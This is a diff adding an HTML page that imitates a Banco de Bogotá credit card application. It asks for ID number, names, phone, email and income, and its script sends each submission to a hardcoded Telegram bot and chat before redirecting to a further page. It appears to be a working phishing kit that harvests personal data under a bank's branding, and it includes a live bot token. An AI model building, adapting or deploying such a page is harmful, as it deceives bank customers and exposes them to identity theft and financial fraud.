@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Bogotá - Formulario de Solicitud</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #2c4a7c 0%, #3d5a8c 50%, #4a6b9d 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Pantalla de carga */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #003d82 0%, #0052a8 50%, #2c4a7c 100%);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loading-content {
+            text-align: center;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loading-logo {
+            width: 200px;
+            height: auto;
+            margin-bottom: 30px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.8;
+            }
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 20px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+
+        /* Header */
+        .header {
+            background-color: #003d82;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            height: 40px;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 500px;
+            margin: 80px auto 20px;
+            background-color: white;
+            border-radius: 20px;
+            padding: 30px 25px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .form-header p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #e0e0e0;
+            z-index: 0;
+        }
+
+        .progress-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            color: #666;
+            position: relative;
+            z-index: 1;
+        }
+
+        .progress-step.active {
+            background-color: #003d82;
+            color: white;
+        }
+
+        .progress-step.completed {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #003d82;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .form-group label .required {
+            color: #ff4757;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #003d82;
+            box-shadow: 0 0 0 3px rgba(0,61,130,0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 2px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .btn-submit {
+            background-color: #003d82;
+            color: white;
+            padding: 15px;
+            border-radius: 25px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 15px rgba(0,61,130,0.3);
+        }
+
+        .btn-submit:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .info-box {
+            background-color: #f0f7ff;
+            border-left: 4px solid #003d82;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .info-box p {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="bancobog.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Cargando...</p>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="header">
+        <a href="index.html" class="back-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 18L9 12L15 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Volver
+        </a>
+        <img src="image.png" alt="Banco de Bogotá" class="logo">
+    </div>
+
+    <!-- Container principal -->
+    <div class="container">
+        <div class="form-header">
+            <h1>Elige una tarjeta y hazla parte de tu día a día</h1>
+            <p>Completa tus datos en menos de 2 minutos</p>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-step active">1</div>
+            <div class="progress-step">2</div>
+            <div class="progress-step">3</div>
+        </div>
+
+        <form id="solicitudForm">
+            <!-- Información Básica -->
+            <div class="form-section">
+                <h2 class="section-title">Información Básica</h2>
+                
+                <div class="form-group">
+                    <label for="documento">Número de documento <span class="required">*</span></label>
+                    <input type="text" id="documento" name="documento" placeholder="Ej: 1234567890" required>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="nombres">Nombres <span class="required">*</span></label>
+                        <input type="text" id="nombres" name="nombres" placeholder="Tus nombres" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="apellidos">Apellidos <span class="required">*</span></label>
+                        <input type="text" id="apellidos" name="apellidos" placeholder="Tus apellidos" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="celular">Número de celular <span class="required">*</span></label>
+                    <input type="tel" id="celular" name="celular" placeholder="Ej: 3001234567" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Correo electrónico <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" placeholder="tu@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ingresos">Ingresos mensuales <span class="required">*</span></label>
+                    <select id="ingresos" name="ingresos" required>
+                        <option value="">Selecciona un rango</option>
+                        <option value="1">Menos de $1,500,000</option>
+                        <option value="2">$1,500,000 - $3,000,000</option>
+                        <option value="3">$3,000,000 - $5,000,000</option>
+                        <option value="4">Más de $5,000,000</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Términos y Condiciones -->
+            <div class="form-section">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terminos" name="terminos" required>
+                    <label for="terminos">
+                        Acepto los <a href="#" style="color: #003d82;">términos y condiciones</a> y autorizo el tratamiento de mis datos personales. <span class="required">*</span>
+                    </label>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="publicidad" name="publicidad">
+                    <label for="publicidad">
+                        Acepto recibir información sobre productos y servicios del Banco de Bogotá.
+                    </label>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">Continuar con la solicitud</button>
+        </form>
+    </div>
+
+    <script>
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '8619673327:AAGD9B3NyEqZQppZh3yHy_wcvxl0ZyVLBZk';
+        const TELEGRAM_CHAT_ID = '-1003500051235';
+        // ========================================
+
+        const form = document.getElementById('solicitudForm');
+
+        // Función para enviar datos a Telegram
+        async function sendToTelegram(data) {
+            const message = `
+🏦 *NUEVA SOLICITUD DE TARJETA - BANCO DE BOGOTÁ*
+
+👤 *Información Personal:*
+• Documento: ${data.documento}
+• Nombres: ${data.nombres}
+• Apellidos: ${data.apellidos}
+
+📱 *Contacto:*
+• Celular: ${data.celular}
+• Email: ${data.email}
+
+💰 *Información Financiera:*
+• Ingresos: ${data.ingresos}
+
+✅ *Términos:*
+• Términos aceptados: Sí
+• Publicidad: ${data.publicidad}
+
+⏰ Fecha: ${new Date().toLocaleString('es-CO')}
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Error al enviar a Telegram:', error);
+                return false;
+            }
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validar que todos los campos requeridos estén completos
+            const formData = new FormData(form);
+            let isValid = true;
+            
+            // Verificar campos obligatorios
+            const requiredFields = ['documento', 'nombres', 'apellidos', 'celular', 'email', 'ingresos'];
+            
+            requiredFields.forEach(field => {
+                if (!formData.get(field)) {
+                    isValid = false;
+                }
+            });
+
+            // Verificar checkbox obligatorio
+            if (!document.getElementById('terminos').checked) {
+                isValid = false;
+                alert('Por favor acepta los términos y condiciones.');
+                return;
+            }
+
+            if (isValid) {
+                // Deshabilitar botón mientras se envía
+                const submitButton = document.querySelector('.btn-submit');
+                submitButton.disabled = true;
+                submitButton.textContent = 'Enviando...';
+
+                // Preparar datos para Telegram
+                const ingresosMap = {
+                    '1': 'Menos de $1,500,000',
+                    '2': '$1,500,000 - $3,000,000',
+                    '3': '$3,000,000 - $5,000,000',
+                    '4': 'Más de $5,000,000'
+                };
+
+                const data = {
+                    documento: formData.get('documento'),
+                    nombres: formData.get('nombres'),
+                    apellidos: formData.get('apellidos'),
+                    celular: formData.get('celular'),
+                    email: formData.get('email'),
+                    ingresos: ingresosMap[formData.get('ingresos')],
+                    publicidad: document.getElementById('publicidad').checked ? 'Sí' : 'No'
+                };
+
+                // Enviar a Telegram
+                const enviado = await sendToTelegram(data);
+
+                if (enviado) {
+                    // Mostrar pantalla de carga
+                    const loadingScreen = document.getElementById('loadingScreen');
+                    loadingScreen.classList.add('show');
+                    
+                    // Redirigir a sucursal.html después de 1.5 segundos
+                    setTimeout(() => {
+                        window.location.href = 'sucursal.html';
+                    }, 1500);
+                } else {
+                    alert('Hubo un error al enviar la solicitud. Por favor intenta nuevamente.');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Continuar con la solicitud';
+                }
+            } else {
+                alert('Por favor completa todos los campos obligatorios.');
+            }
+        });
+
+        // Validación de solo números en documento
+        document.getElementById('documento').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Validación de celular
+        document.getElementById('celular').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 10) {
+                this.value = this.value.slice(0, 10);
+            }
+        });
+
+        // Animación de botón
+        document.querySelector('.btn-submit').addEventListener('click', function() {
+            this.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                this.style.transform = 'scale(1)';
+            }, 100);
+        });
+    </script>
+</body>
+</html>
